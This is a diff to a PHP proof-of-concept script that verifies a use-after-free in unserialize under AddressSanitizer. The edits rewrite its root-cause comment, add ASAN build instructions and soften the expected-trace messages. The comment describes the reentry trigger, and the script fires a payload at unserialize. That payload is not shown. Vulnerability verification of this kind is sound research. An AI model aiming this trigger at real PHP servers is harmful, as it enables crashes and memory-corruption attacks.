@@ -2,13 +2,25 @@
 /**
  * CVE-2026-109618/109619 — var_destroy __destruct reentry UAF verification.
  *
- * Triggers ASAN heap-use-after-free in php_var_unserialize (var_unserializer.c:851).
+ * Triggers a heap-use-after-free in php_var_unserialize: var_destroy() frees
+ * back-reference extension chunks while building the dtor list, then
+ * i_zval_ptr_dtor fires __destruct WITHOUT BG(serialize_lock). The inner
+ * unserialize('R:1500;') reuses the outer var_hash (freed entries) → UAF read.
  *
- * Run with: USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php verify_uaf_asan.php
+ * ⚠️  This PoC requires an ASAN build of PHP. This repository does NOT ship
+ * one (there is no php-asan-lab image) — build it yourself, e.g.:
  *
- * Root cause: var_destroy() frees back-reference extension chunks (line 245),
- * then i_zval_ptr_dtor at line 310 fires __destruct WITHOUT BG(serialize_lock).
- * Inner unserialize('R:1500;') reuses the outer var_hash (freed entries) → UAF read.
+ *   docker run --rm -it php:8.2.34 \
+ *     bash -c "apt-get update && apt-get install -y clang libasan6 && \
+ *       export CC=clang CFLAGS='-fsanitize=address -g' LDFLAGS='-fsanitize=address' && \
+ *       ./configure --enable-debug && make -j\$(nproc)"
+ *
+ * Run with:  USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php verify_uaf_asan.php
+ *
+ * Without ASAN the UAF is silent (may crash or return garbage) — a clean run
+ * with no ASAN report is NOT evidence of absence.
+ *
+ * Line numbers below refer to the PHP-8.2 branch and drift between versions.
  *
  * For authorized security testing only.
  */
@@ -43,6 +55,6 @@ fwrite(STDERR, "[*] Firing unserialize()...\n");
 @unserialize($payload);
 
 fwrite(STDERR, "[*] Done. If ASAN reported heap-use-after-free, the UAF is confirmed.\n");
-fwrite(STDERR, "[*] Expected ASAN trace:\n");
-fwrite(STDERR, "    READ at php_var_unserialize (var_unserializer.c:851)\n");
-fwrite(STDERR, "    freed at var_destroy (var_unserializer.c:245)\n");
+fwrite(STDERR, "[*] Expected ASAN trace (line numbers drift between versions):\n");
+fwrite(STDERR, "    READ at php_var_unserialize (back-reference resolution)\n");
+fwrite(STDERR, "    freed at var_destroy (var_hash extension chunk teardown)\n");
